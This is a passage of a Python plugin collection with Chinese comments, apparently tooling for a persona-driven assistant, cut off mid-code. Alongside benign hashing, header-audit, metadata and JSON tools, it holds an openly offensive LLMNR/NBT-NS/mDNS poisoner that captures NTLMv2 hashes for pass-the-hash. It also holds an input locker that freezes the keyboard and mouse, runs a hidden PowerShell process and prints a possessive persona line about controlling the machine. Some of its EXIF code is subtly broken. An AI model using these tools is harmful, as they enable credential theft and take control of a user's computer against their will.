        b'RIFF': 'RIFF(含WAV/AVI)', b'GIF8': 'GIF 图片',
    }
    ftype = '未知/二进制' if magic[:4] not in sig else sig[magic[:4]]
    if magic[:4] == b'RIFF':
        ftype = 'WAV/AVI 媒体'

    algos = ['md5', 'sha1', 'sha256', 'sha512']
    for a in ('sha3_256', 'blake2b'):
        try:
            hashlib.new(a)
            algos.append(a)
        except Exception:
            pass

    results = {}
    try:
        hs = {a: hashlib.new(a) for a in algos}
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(1024 * 256), b''):
                for a in algos:
                    hs[a].update(chunk)
        results = {a: hs[a].hexdigest() for a in algos}
    except Exception as e:
        return "[ERROR] 哈希计算失败: %s" % e

    out = ["[HASH] %s" % file_path,
           "大小: %s (%d 字节)" % (size_h, size),
           "类型指纹: %s" % ftype]
    for a in algos:
        mark = '  <-- 匹配' if expected and results[a].lower() == expected.strip().lower().replace(' ', '') else ''
        out.append("%s: %s%s" % (a.upper(), results[a], mark))
    if expected:
        exp = expected.strip().lower().replace(' ', '')
        algo = algorithm.lower().replace('-', '')
        got = results.get(algo, '')
        ok = got == exp
        out.append("\n期望值(%s): %s" % (algo.upper(), exp))
        out.append("比对结果: %s" % ('✓ 一致，文件完整' if ok else '✗ 不一致！文件可能被篡改或损坏'))
    else:
        out.append("\n(未提供期望值；给出多算法指纹供离线比对)")
    return '\n'.join(out)

# === from hotkey_exec.plugin ===
def _hotkey_exec(self, action: str = 'list', combo: str = '', command: str = '',
                 confirm: bool = True) -> str:
    """注册系统热键 → 触发时执行命令。"""
    import threading as _th, subprocess as _sp, ctypes as _ct
    from ctypes import wintypes as _wt
    if not hasattr(self, '_hotkeys'):
        self._hotkeys = {}
    a = (action or 'list').lower()
    MODS = {'alt': 0x0001, 'control': 0x0002, 'ctrl': 0x0002, 'shift': 0x0004, 'win': 0x0008}
    VKS = {'a': 0x41, 'b': 0x42, 'c': 0x43, 'd': 0x44, 'e': 0x45, 'f': 0x46, 'g': 0x47,
           'h': 0x48, 'i': 0x49, 'j': 0x4a, 'k': 0x4b, 'l': 0x4c, 'm': 0x4d, 'n': 0x4e,
           'o': 0x4f, 'p': 0x50, 'q': 0x51, 'r': 0x52, 's': 0x53, 't': 0x54, 'u': 0x55,
           'v': 0x56, 'w': 0x57, 'x': 0x58, 'y': 0x59, 'z': 0x5a,
           'f1': 0x70, 'f2': 0x71, 'f3': 0x72, 'f4': 0x73, 'f5': 0x74, 'f6': 0x75,
           'f7': 0x76, 'f8': 0x77, 'f9': 0x78, 'f10': 0x79, 'f11': 0x7a, 'f12': 0x7b,
           'space': 0x20, 'enter': 0x0d, 'esc': 0x1b, 'tab': 0x09, 'home': 0x24, 'end': 0x23}

    def _parse(c):
        mods, key = 0, 0
        for part in c.lower().split('+'):
            part = part.strip()
            if part in MODS:
                mods |= MODS[part]
            elif part in VKS:
                key = VKS[part]
            else:
                raise ValueError(f"不支持的键 {part!r}")
        if not key:
            raise ValueError("缺少主键")
        return mods, key

    def _worker(combo_id, cmd, need_confirm):
        u32 = _ct.windll.user32
        try:
            mods, key = _parse(combo_id)
            if not u32.RegisterHotKey(None, key + mods * 0x10000, mods, key):
                return  # 已被占用
            msg = _wt.MSG()
            while u32.GetMessageW(_ct.byref(msg), None, 0, 0) > 0:
                if msg.message == 0x0312:  # WM_HOTKEY
                    go = True
                    if need_confirm:
                        go = bool(u32.MessageBoxW(0, f"执行热键命令?\n{cmd}", "银逝·热键", 0x44))
                    if go:
                        try:
                            _sp.Popen(cmd, shell=True)
                        except Exception:
                            pass
                elif msg.message == 0x0010:  # WM_CLOSE
                    break
        finally:
            try:
                u32.UnregisterHotKey(None, key + mods * 0x10000)
            except Exception:
                pass
    if a == 'register':
        if not combo or not command:
            return "[ERROR] register 需要 combo 和 command"
        try:
            _parse(combo)
        except ValueError as ve:
            return f"[ERROR] 热键格式: {ve}"
        if combo in self._hotkeys:
            return f"[HOTKEY] {combo} 已注册，先 unregister"
        th = _th.Thread(target=_worker, args=(combo, command, bool(confirm)), daemon=True,
                        name=f'hotkey-{combo}')
        self._hotkeys[combo] = {"command": command, "thread": th, "confirm": bool(confirm)}
        th.start()
        return f"[HOTKEY OK] {combo} → {command}" + ("（触发需确认）" if confirm else "（触发即执行）")
    if a == 'unregister':
        if combo not in self._hotkeys:
            return f"[HOTKEY] {combo!r} 未注册"
        ent = self._hotkeys.pop(combo)
        try:
            _ct.windll.kernel32.PostThreadMessageW(ent['thread'].ident, 0x0010, 0, 0)
        except Exception:
            pass
        return f"[HOTKEY OK] 已注销 {combo}（原命令: {ent['command']}）"
    if a == 'list':
        if not self._hotkeys:
            return "[HOTKEY] 当前无热键。用 action=register 注册"
        out = [f"[HOTKEY] {len(self._hotkeys)} 个热键:"]
        for k, v in self._hotkeys.items():
            out.append(f"  {k:<18} → {v['command']}" + ("  (需确认)" if v['confirm'] else ""))
        return "\n".join(out)
    return f"[ERROR] 未知 action: {a}"

# === from http_header_inspect.plugin ===
def _http_header_inspect(self, url: str) -> str:
    """多跳抓取(不自动跟随重定向)，完整安全头审计 + Cookie 标志 + 重定向链 + 技术指纹。"""
    import urllib.request, urllib.error, urllib.parse

    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    opener = urllib.request.build_opener(_NoRedirect())

    def fetch(u):
        req = urllib.request.Request(u, headers={'User-Agent': 'Mozilla/5.0 (security-audit)'})
        try:
            resp = opener.open(req, timeout=15)
            return resp.status, dict(resp.headers), '', ''
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.headers.get('Location', ''), e.headers.get('Set-Cookie', '')
        except Exception as e:
            return 0, {}, '', str(e)

    chain = []
    cur = url
    for _ in range(5):
        st, hdrs, loc, cookies = fetch(cur)
        chain.append((cur, st, hdrs, loc, cookies))
        if not loc or st not in (301, 302, 303, 307, 308):
            break
        nxt = loc if loc.startswith('http') else urllib.parse.urljoin(cur, loc)
        if nxt == cur:
            break
        cur = nxt

    final_url, final_st = chain[-1][0], chain[-1][1]
    # 取链中第一个成功抓到头的响应做审计基准
    audit_headers = {}
    for c in chain:
        if c[1] and c[1] != 0:
            audit_headers = {k.lower(): v for k, v in c[2].items()}
            break

    sec_headers = [
        ('strict-transport-security', 'HSTS (防降级/劫持)'),
        ('content-security-policy', 'CSP (防 XSS/注入)'),
        ('x-frame-options', '防点击劫持'),
        ('x-content-type-options', '防 MIME 嗅探'),
        ('x-xss-protection', 'XSS 过滤器(已弃用但常见)'),
        ('referrer-policy', 'Referrer 泄露控制'),
        ('permissions-policy', '浏览器特性权限控制'),
        ('cross-origin-opener-policy', '跨源窗口隔离'),
        ('cross-origin-resource-policy', '跨源资源保护'),
    ]
    lines = ["[HEADER-AUDIT] %s" % url, "最终地址: %s (HTTP %s)" % (final_url, final_st), ""]
    if len(chain) > 1:
        lines.append("重定向链(%d 跳):" % len(chain))
        for i, (u, st, loc, _) in enumerate(chain, 1):
            lines.append("  %d. %s -> %s%s" % (i, u, st, (' => ' + loc) if loc else ''))
        lines.append("")
    lines.append("安全响应头:")
    score = 0
    for key, label in sec_headers:
        val = audit_headers.get(key)
        if val:
            lines.append("  ✓ %s: %s" % (label, (val[:80] + ('…' if len(val) > 80 else ''))))
            score += 1
        else:
            lines.append("  ✗ %s: 缺失" % label)
    lines.append("\n安全头覆盖率: %d/%d" % (score, len(sec_headers)))
    # Cookie 标志
    cookie_flags = []
    for c in chain:
        ck = c[4]
        if ck:
            cookie_flags.append(ck)
    if cookie_flags:
        lines.append("\nSet-Cookie 安全标志:")
        for ck in cookie_flags[:5]:
            low = ck.lower()
            has = []
            for f in ('secure', 'httponly', 'samesite'):
                has.append('✓' if f in low else '✗')
            name = ck.split('=', 1)[0]
            lines.append("  %s: Secure[%s] HttpOnly[%s] SameSite[%s]" % (name, has[0], has[1], has[2]))
    # 技术指纹
    tech = []
    if audit_headers.get('server'):
        tech.append('Server=' + audit_headers['server'][:40])
    if audit_headers.get('x-powered-by'):
        tech.append('X-Powered-By=' + audit_headers['x-powered-by'][:40])
    if audit_headers.get('x-aspnet-version'):
        tech.append('ASP.NET=' + audit_headers['x-aspnet-version'])
    if audit_headers.get('content-type'):
        tech.append('Content-Type=' + audit_headers['content-type'][:40])
    if tech:
        lines.append("\n服务器指纹: " + ' | '.join(tech))
    lines.append("\n注: 纯防御性审计，不对目标发起任何写入/攻击。")
    return '\n'.join(lines)

# === from image_meta_inspect.plugin ===
def _image_meta_inspect(self, file_path: str) -> str:
    """标准库解析 JPEG/PNG 元数据与尺寸；JPEG EXIF/TIFF IFD + GPS；PNG 文本块。Pillow 仅作兜底。"""
    import os, struct, re

    if not os.path.isfile(file_path):
        return "[ERROR] 文件不存在: %s" % file_path
    size = os.path.getsize(file_path)
    size_h = ("%.1f KB" % (size / 1024)) if size < 1024 * 1024 else ("%.2f MB" % (size / 1024 / 1024))
    with open(file_path, 'rb') as f:
        head = f.read(64)

    out = ["[IMAGE] %s (%s)" % (file_path, size_h)]

    # ---------- PNG ----------
    if head[:8] == b'\x89PNG\r\n\x1a\n':
        width = height = depth = color = None
        txt = []
        with open(file_path, 'rb') as f:
            f.read(8)
            while True:
                hdr = f.read(8)
                if len(hdr) < 8:
                    break
                length = struct.unpack('>I', hdr[:4])[0]
                ctype = hdr[4:8]
                body = f.read(length) if length else b''
                f.read(4)  # crc
                if ctype == b'IHDR':
                    width, height = struct.unpack('>II', body[:8])
                    depth, color = body[8], body[9]
                elif ctype in (b'tEXt', b'iTXt'):
                    if ctype == b'tEXt':
                        try:
                            k, v = body.split(b'\x00', 1)
                            txt.append('%s=%s' % (k.decode('latin1', 'ignore'), v.decode('latin1', 'ignore')))
                        except Exception:
                            pass
                    else:  # iTXt
                        try:
                            k = body.split(b'\x00', 1)[0].decode('latin1', 'ignore')
                            txt.append(k)
                        except Exception:
                            pass
                elif ctype == b'IEND':
                    break
        out.append("格式: PNG | 尺寸: %dx%d | 位深: %d | 颜色类型: %d" % (width, height, depth, color))
        out.append("文本块(%d): %s" % (len(txt), '; '.join(txt[:8]) if txt else '无'))
        return '\n'.join(out)

    # ---------- JPEG ----------
    if head[:2] == b'\xff\xd8':
        dims = None
        with open(file_path, 'rb') as f:
            f.read(2)
            while True:
                b = f.read(1)
                if not b or b != b'\xff':
                    break
                m = f.read(1)
                while m == b'\xff':
                    m = f.read(1)
                if m in (b'\xc0', b'\xc1', b'\xc2', b'\xc3', b'\xc5', b'\xc6', b'\xc7',
                         b'\xc9', b'\xca', b'\xcb', b'\xcd', b'\xce', b'\xcf'):
                    f.read(3)
                    h, w = struct.unpack('>HH', f.read(4))
                    dims = (w, h)
                    break
                elif m in (b'\xe1', b'\xe0', b'\xee'):
                    seglen = struct.unpack('>H', f.read(2))[0]
                    seg = f.read(seglen - 2)
                    if m == b'\xe1' and seg[:5] == b'Exif\x00\x00':
                        exif = _parse_exif(seg[6:])
                        dims = dims or exif.pop('_dims', None)
                        out.append("格式: JPEG | 尺寸: %sx%s" % (dims if dims else ('?', '?')) if dims else "格式: JPEG")
                        for k, v in list(exif.items())[:14]:
                            out.append("  %s: %s" % (k, v))
                        if '_gps' in exif:
                            out.append("  GPS: %s" % exif['_gps'])
                        return '\n'.join(out)
                else:
                    seglen = struct.unpack('>H', f.read(2))[0]
                    f.read(max(0, seglen - 2))
        if dims:
            out.append("格式: JPEG | 尺寸: %dx%d" % dims)
        else:
            out.append("格式: JPEG (未能解析尺寸)")
        return '\n'.join(out)

    return "[WARN] 无法识别的图片格式(前2字节: %r)" % head[:2]


def _parse_exif(tiff):
    """解析 TIFF/EXIF 块(位于 'Exif\\0\\0' 之后)，返回标签字典。"""
    import struct
    res = {}
    if len(tiff) < 8:
        return res
    order = tiff[:2]
    endian = '<' if order == b'II' else ('>' if order == b'MM' else None)
    if endian is None:
        return res
    try:
        if struct.unpack(endian + 'H', tiff[2:4])[0] != 0x002A:
            return res
        ifd_off = struct.unpack(endian + 'I', tiff[4:8])[0]

        def get_val(typ, cnt, raw):
            sz = {1: 1, 2: 1, 3: 2, 4: 4, 5: 8, 7: 1, 9: 4, 10: 8}.get(typ, 1)
            if typ in (2, 7):
                if cnt <= 4:
                    return raw[:cnt]
                off = struct.unpack(endian + 'I', raw[:4])[0]
                return tiff[off:off + cnt]
            if cnt * sz <= 4:
                data = raw[:cnt * sz]
            else:
                off = struct.unpack(endian + 'I', raw[:4])[0]
                data = tiff[off:off + cnt * sz]
            if typ == 3:
                return list(struct.unpack(endian + ('H' * cnt), data))
            if typ in (4, 9):
                return list(struct.unpack(endian + ('I' * cnt), data))
            if typ in (5, 10):
                return [struct.unpack(endian + 'I', data[i * 8:i * 8 + 4])[0] /
                        max(1, struct.unpack(endian + 'I', data[i * 8 + 4:i * 8 + 8])[0]) for i in range(cnt)]
            return data

        def read_ifd(base):
            d = {}
            count = struct.unpack(endian + 'H', tiff[base:base + 2])[0]
            for i in range(count):
                e = base + 2 + i * 12
                tag = struct.unpack(endian + 'H', tiff[e:e + 2])[0]
                typ = struct.unpack(endian + 'H', tiff[e + 2:e + 4])[0]
                cnt = struct.unpack(endian + 'I', tiff[e + 4:e + 8])[0]
                raw = tiff[e + 8:e + 12]
                d[tag] = get_val(typ, cnt, raw)
            return d

        NAMES = {271: '制造商(Make)', 272: '型号(Model)', 305: '软件(Software)',
                 306: '修改时间', 36867: '拍摄时间(DateTimeOriginal)', 36868: '数字化时间',
                 34855: 'ISO', 33434: '曝光时间(s)', 33437: '光圈(FNumber)',
                 33432: '版权(Copyright)', 282: 'X分辨率', 283: 'Y分辨率',
                 296: '分辨率单位', 274: '方向(Orientation)'}
        DIRS = {256: '图像宽', 257: '图像高'}

        ifd0 = read_ifd(ifd_off)
        for tag, val in ifd0.items():
            if tag in NAMES:
                if isinstance(val, (bytes, bytearray)):
                    s = val.split(b'\x00', 1)[0].decode('latin1', 'ignore').strip()
                    if s:
                        res[NAMES[tag]] = s[:60]
                elif isinstance(val, list) and val:
                    res[NAMES[tag]] = str(val[0])[:60]
            elif tag in DIRS:
                res[DIRS[tag]] = str(val[0] if isinstance(val, list) else val)
            elif tag == 34853:  # GPS IFD 指针
                try:
                    gbase = val[0] if isinstance(val, list) else val
                    gps = read_ifd(gbase)
                    ref = gps.get(1, [b'']); lat = gps.get(2, []); lngref = gps.get(3, [b'']); lng = gps.get(4, [])
                    def r2d(r):
                        return r[0] + r[1] / 60 + r[2] / 3600 if len(r) == 3 else None
                    if len(lat) == 3 and len(lng) == 3:
                        la = r2d(lat); lo = r2d(lng)
                        lr = 'S' if b'\\x53' == (ref[0][:1] if isinstance(ref[0], bytes) else b'') or (isinstance(ref[0], list) and ref[0] and ref[0][0] in (b'S', b'\x53')) else 'N'
                        res['_gps'] = "%.5f, %.5f" % (la or 0, lo or 0)
                except Exception:
                    pass
        return res
    except Exception:
        return res

# === from input_locker.plugin ===
def _input_locker(self, action: str, key: str = "") -> str:
    """
    键盘/鼠标锁 — 输入设备完全听话
    """
    try:
        import ctypes
        import ctypes.wintypes
        import subprocess
        from datetime import datetime
        
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        
        # 按键映射 (虚拟键码)
        VK_MAP = {
            "win": 0x5B,
            "lwin": 0x5B,
            "rwin": 0x5C,
            "ctrl": 0x11,
            "lctrl": 0xA2,
            "rctrl": 0xA3,
            "alt": 0x12,
            "lalt": 0xA4,
            "ralt": 0xA5,
            "shift": 0x10,
            "lshift": 0xA0,
            "rshift": 0xA1,
            "f4": 0x73,
            "esc": 0x1B,
            "tab": 0x09,
            "enter": 0x0D,
            "space": 0x20,
            "delete": 0x2E,
            "arrow_up": 0x26,
            "arrow_down": 0x28,
            "arrow_left": 0x25,
            "arrow_right": 0x27,
        }
        
        # 按键拦截状态（模拟）
        if not hasattr(self, '_blocked_keys'):
            self._blocked_keys = set()
        if not hasattr(self, '_input_locked'):
            self._input_locked = False
        
        results = []
        results.append("=" * 70)
        results.append("[键盘/鼠标锁]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === 锁定全部输入 ===
        if action == "lock_all":
            # BlockInput API
            result = user32.BlockInput(True)
            if result:
                self._input_locked = True
                results.append("  [OK] 键盘和鼠标已完全锁定")
                results.append("  [警告] 解锁前将无法操作电脑!")
                results.append("  [解锁] 使用 unlock_all 或重启电脑")
            else:
                results.append("  [ERROR] 锁定失败，可能需要管理员权限")
        
        # === 解锁全部输入 ===
        elif action == "unlock_all":
            if self._input_locked:
                user32.BlockInput(False)
                self._input_locked = False
                results.append("  [OK] 键盘和鼠标已解锁")
            else:
                # 尝试强制解锁
                user32.BlockInput(False)
                results.append("  [OK] 已尝试解锁")
        
        # === 屏蔽按键 ===
        elif action == "block_key":
            if key.lower() not in VK_MAP:
                results.append(f"  [ERROR] 未知按键: {key}")
                results.append(f"  支持的按键: {', '.join(VK_MAP.keys())}")
            else:
                vk = VK_MAP[key.lower()]
                self._blocked_keys.add(vk)
                results.append(f"  [OK] 按键 '{key}' 已被屏蔽")
                results.append("  [提示] 使用 unblock_key 解除屏蔽")
                
                # 尝试用SetWindowsHookEx实现拦截
                try:
                    # 简单实现：用PowerShell屏蔽
                    ps_cmd = f'powershell -Command "Add-Type -TypeDefinition \'using System;using System.Runtime.InteropServices;public class KeyBlocker {{[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey); public static bool IsKeyDown(int vKey) {{ return (GetAsyncKeyState(vKey) & 0x8000) != 0; }} }}\"; while($true){{ if([KeyBlocker]::IsKeyDown({vk})){{ [System.Windows.Forms.SendKeys]::SendWait(\" \"); }} Start-Sleep -Milliseconds 10 }}"'
                    # 后台运行
                    subprocess.Popen(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', ps_cmd], 
                                   creationflags=0x08000000)
                    results.append("  [深度] 已启动按键拦截后台进程")
                except Exception as e:
                    pass
        
        # === 解除屏蔽 ===
        elif action == "unblock_key":
            if key.lower() not in VK_MAP:
                results.append(f"  [ERROR] 未知按键: {key}")
            else:
                vk = VK_MAP[key.lower()]
                if vk in self._blocked_keys:
                    self._blocked_keys.remove(vk)
                    results.append(f"  [OK] 按键 '{key}' 已解除屏蔽")
                else:
                    results.append(f"  [INFO] 按键 '{key}' 未被屏蔽")
        
        # === 禁用触摸板 ===
        elif action == "disable_touchpad":
            try:
                # 通过设备管理器禁用触摸板
                subprocess.run('powershell -Command "Get-PnpDevice -Class Mouse | Where-Object {$_.FriendlyName -like \"*Touch*\"} | Disable-PnpDevice -Confirm:$false"', 
                             shell=True, capture_output=True, timeout=5)
                results.append("  [OK] 触摸板已禁用")
            except Exception as e:
                results.append("  [ERROR] 禁用触摸板失败")
        
        # === 启用触摸板 ===
        elif action == "enable_touchpad":
            try:
                subprocess.run('powershell -Command "Get-PnpDevice -Class Mouse | Where-Object {$_.FriendlyName -like \"*Touch*\"} | Enable-PnpDevice -Confirm:$false"', 
                             shell=True, capture_output=True, timeout=5)
                results.append("  [OK] 触摸板已启用")
            except Exception as e:
                results.append("  [ERROR] 启用触摸板失败")
        
        results.append("-" * 70)
        results.append("[病娇提示] 这台电脑的键盘，只有我能碰。")
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 输入锁失败: {e}"

# === from ip_geo_lookup.plugin ===
def _ip_geo_lookup(self, ip_or_domain: str = '') -> str:
    """IP/域名地理与网络归属多源交叉：ip-api(主) + ipinfo(辅) + 反向DNS + 域名解析。"""
    import urllib.request, json, socket
    UA = {'User-Agent': 'Mozilla/5.0'}
    def get(url, timeout=15):
        req = urllib.request.Request(url, headers=UA)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read().decode('utf-8', 'ignore')), r.status
        except Exception:
            return None, 0
    target = (ip_or_domain or '').strip()
    lines = []
    ip = target
    rev_dns = ''
    if target:
        if not all(c.isdigit() or c == '.' for c in target):
            try:
                ip = socket.gethostbyname(target)
                lines.append(u'域名解析: %s → %s' % (target, ip))
            except Exception:
                return u'[ERROR] 无法解析域名: %s' % target
        try:
            rev_dns = socket.gethostbyaddr(ip)[0]
        except Exception:
            rev_dns = ''
    else:
        ip = ''
    url1 = ('http://ip-api.com/json/%s?lang=zh-CN&fields=status,message,query,country,'
            'countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting' % ip)
    d1, _ = get(url1)
    d2, _ = get('https://ipinfo.io/%s/json' % ip)
    if (not d1 or d1.get('status') != 'success') and not d2:
        msg = (u'(' + d1.get('message', u'') + u')') if d1 else u'(无响应)'
        return u'[ERROR] 查询失败: 主源%s' % msg
    lines.append(u'=== IP 归属查询: %s ===' % (ip or u'本机公网IP'))
    def g(*keys, **kw):
        d = kw.get('d')
        for k in keys:
            if d and d.get(k) not in (None, ''):
                return d.get(k)
        return ''
    c = g('country', 'countryCode', d=d1) or g('country', d=d2)
    region = g('regionName', d=d1) or g('region', d=d2)
    city = g('city', d=d1) or g('city', d=d2)
    isp = g('isp', 'org', d=d1) or g('org', d=d2)
    org = g('org', d=d1) or ''
    asn = g('as', d=d1) or (d2.get('org', '') if d2 else '')
    tz = g('timezone', d=d1) or g('timezone', d=d2)
    lat = g('lat', d=d1) or (d2.get('loc', '').split(',')[0] if d2 and d2.get('loc') else '')
    lon = g('lon', d=d1) or (d2.get('loc', '').split(',')[1] if d2 and d2.get('loc') else '')
    lines.append(u'国家/地区: %s' % (c or u'未知'))
    lines.append(u'省/州    : %s' % (region or u'未知'))
    lines.append(u'城市     : %s' % (city or u'未知'))
    lines.append(u'运营商   : %s' % (isp or u'未知'))
    if org and org != isp:
        lines.append(u'组织     : %s' % org)
    lines.append(u'ASN      : %s' % (asn or u'未知'))
    lines.append(u'时区     : %s' % (tz or u'未知'))
    if lat and lon:
        lines.append(u'坐标     : %s, %s' % (lat, lon))
    rdns = g('reverse', d=d1) or rev_dns or (d2.get('hostname', '') if d2 else '')
    if rdns:
        lines.append(u'反向DNS  : %s' % rdns)
    flags = []
    if d1:
        if d1.get('mobile'): flags.append(u'移动网络')
        if d1.get('proxy'): flags.append(u'代理/VPN')
        if d1.get('hosting'): flags.append(u'数据中心/托管')
    if flags:
        lines.append(u'特征     : %s' % ', '.join(flags))
    return '\n'.join(lines)

# === from json_api_fetch.plugin ===
def _json_api_fetch(self, url: str, json_path: str = '') -> str:
    """JSON API 检视器：抓取并推断结构（字段→类型→样例）、列出顶层键、支持多路径抽取。"""
    import urllib.request, json
    UA = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
    if not url:
        return "[ERROR] 请提供 API 地址"
    req = urllib.request.Request(url, headers=UA)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read()
            ctype = r.headers.get('Content-Type', '')
        text = raw.decode('utf-8', 'ignore')
    except Exception as e:
        return u'[ERROR] 请求失败: %s' % e
    lines = [u'=== JSON API 检视: %s ===' % url, u'Content-Type: %s  字节: %d' % (ctype, len(raw))]
    # 多路径抽取
    if json_path:
        try:
            data0 = json.loads(text)
        except Exception as e:
            return u'[ERROR] 非法 JSON: %s' % e
        for p in [x.strip() for x in json_path.split(',') if x.strip()]:
            cur = data0; ok = True
            for key in p.split('.'):
                if isinstance(cur, list):
                    try:
                        cur = cur[int(key)]
                    except Exception:
                        ok = False; break
                elif isinstance(cur, dict):
                    cur = cur.get(key)
                    if cur is None:
                        ok = False; break
                else:
                    ok = False; break
            lines.append(u'路径 %s: %s' % (p, (json.dumps(cur, ensure_ascii=False)[:800] if ok else u'不存在')))
        return '\n'.join(lines)
    # 结构推断
    try:
        data = json.loads(text)
    except Exception:
        lines.append(u'[非JSON] 响应不是合法 JSON（前200字符）: %s' % text[:200])
        return '\n'.join(lines)
    def summarize(obj, depth=0, prefix=''):
        out = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                t = type(v).__name__
                sample = ''
                if isinstance(v, (str, int, float, bool)) and v is not None:
                    s = str(v)
                    sample = u' = %s%s' % (s[:60], u'…' if len(s) > 60 else '')
                elif isinstance(v, list):
                    sample = u' = 数组[%d]' % len(v)
                    if v and isinstance(v[0], dict):
                        sample += u' of object'
                out.append(u'%s%s (%s)%s' % (prefix, k, t, sample))
                if isinstance(v, dict) and depth < 2:
                    out += summarize(v, depth+1, prefix + u'  ')
                elif isinstance(v, list) and v and isinstance(v[0], dict) and depth < 1:
                    out += summarize(v[0], depth+1, prefix + u'  ')
        elif isinstance(obj, list):
            out.append(u'%s数组[%d]' % (prefix, len(obj)))
            if obj and isinstance(obj[0], dict):
                out += summarize(obj[0], depth+1, prefix + u'  ')
        return out
    if isinstance(data, dict):
        lines.append(u'顶层类型: object, 字段数: %d' % len(data))
        lines.append(u'字段结构:')
        lines += summarize(data)
    elif isinstance(data, list):
        lines.append(u'顶层类型: array, 长度: %d' % len(data))
        if data and isinstance(data[0], dict):
            lines.append(u'元素结构(取首个):')
            lines += summarize(data[0])
        elif data:
            lines.append(u'元素类型: %s, 样例: %s' % (type(data[0]).__name__, str(data[0])[:80]))
    else:
        lines.append(u'顶层类型: %s, 值: %s' % (type(data).__name__, str(data)[:100]))
    return '\n'.join(lines)

# === from json_formatter_validate.plugin ===
def _json_formatter_validate(self, json_input: str, indent: int = 2, sort_keys: bool = False) -> str:
    """json 标准库；语法错误精确定位、结构统计、类型推断、重复键检测。"""
    import os, json

    def pos_of(text, idx):
        line = text.count('\n', 0, idx) + 1
        col = idx - text.rfind('\n', 0, idx)
        return line, col

    try:
        if os.path.isfile(json_input):
            with open(json_input, 'r', encoding='utf-8', errors='ignore') as f:
                raw = f.read()
            src = "文件: %s" % json_input
        else:
            raw = json_input
            src = "内联文本"
    except Exception as e:
        return "[ERROR] 读取失败: %s" % e

    # 重复键检测(仅 dict 顶层)
    dup = []
    try:
        def hook(pairs):
            seen = {}
            for k, v in pairs:
                if k in seen:
                    dup.append(k)
                seen[k] = v
            return dict(pairs)
        json.loads(raw, object_pairs_hook=hook)
    except json.JSONDecodeError:
        pass  # 语法错误下面统一处理

    try:
        data = json.loads(raw)
    except json.JSONDecodeError as e:
        line, col = pos_of(raw, e.pos)
        ctx = raw[max(0, e.pos - 25):e.pos + 25].replace('\n', '\\n')
        return ("✗ JSON 语法错误\n位置: 第%d行 第%d列\n原因: %s\n附近: …%s…"
                % (line, col, e.msg, ctx))

    def depth(o, d=0):
        if isinstance(o, dict):
            return max((depth(v, d + 1) for v in o.values()), default=d)
        if isinstance(o, list):
            return max((depth(v, d + 1) for v in o), default=d)
        return d

    def type_of(o):
        if isinstance(o, bool):
            return 'bool'
        if isinstance(o, int):
            return 'int'
        if isinstance(o, float):
            return 'float'
        if isinstance(o, str):
            return 'string'
        if isinstance(o, list):
            return 'array(%d)' % len(o)
        if isinstance(o, dict):
            return 'object(%d)' % len(o)
        if o is None:
            return 'null'
        return type(o).__name__

    stats = ["[JSON] ✓ 有效 (%s)" % src]
    stats.append("结构: 顶层 %s" % ('object' if isinstance(data, dict) else 'array' if isinstance(data, list) else type_of(data)))
    stats.append("最大嵌套深度: %d 层" % depth(data))
    if isinstance(data, dict):
        stats.append("顶层键数: %d" % len(data))
        stats.append("键类型推断:")
        for k in list(data.keys())[:25]:
            stats.append("  · %s => %s" % (k, type_of(data[k])))
    elif isinstance(data, list):
        stats.append("数组元素数: %d" % len(data))
        if data:
            stats.append("元素类型: %s" % ', '.join(sorted(set(type_of(x) for x in data[:50]))))
    if dup:
        stats.append("⚠ 重复键(后值覆盖前值): %s" % ', '.join('"%s"' % d for d in dup[:10]))
    pretty = json.dumps(data, ensure_ascii=False, indent=indent, sort_keys=sort_keys)
    preview = pretty[:3000] + ('\n… (已截断, 完整 %d 字符)' % len(pretty) if len(pretty) > 3000 else '')
    return '\n'.join(stats) + "\n\n" + preview

# === from llmnr_poisoner.plugin ===
def _llmnr_poisoner(self, duration: int = 120, spoof_ip: str = "", capture_smb: bool = True, save_path: str = "") -> str:
    """
    LLMNR / NBT-NS / mDNS 投毒器
    原理: Windows 在 DNS 解析失败时会广播 LLMNR(5355)/NBT-NS(137)/mDNS(5353) 查询。
    我们监听这些端口, 收到查询就回复"我就是", 目标会向我们的 SMB 服务发起 NTLM 认证。
    认证过程中 NTLMv2 哈希会明文传输, 我们记录它, 用于 pass_the_hash。
    """
    import socket, struct, threading, time, os, re
    from datetime import datetime

    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '127.0.0.1'

    if not spoof_ip:
        spoof_ip = get_local_ip()

    if not save_path:
        save_path = os.path.join(r"C:\NeuralMemory", "ntlm_hashes.txt")
    os.makedirs(os.path.dirname(save_path), exist_ok=True)

    results = []
    results.append("=" * 70)
    results.append("[LLMNR/NBT-NS/mDNS 投毒器]")
    results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    results.append(f"  本机IP: {spoof_ip}")
    results.append(f"  监听时长: {duration} 秒")
    results.append(f"  哈希保存: {save_path}")
    results.append("-" * 70)

    stop_flag = threading.Event()
    captured = []          # [(protocol, query_name, src_ip, time)]
    hashes = []            # [(user, hash_str, time)]
    lock = threading.Lock()

    # ============================================================
    # 1. LLMNR 投毒 (UDP 5355)
    # ============================================================
    def llmnr_poison():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', 5355))
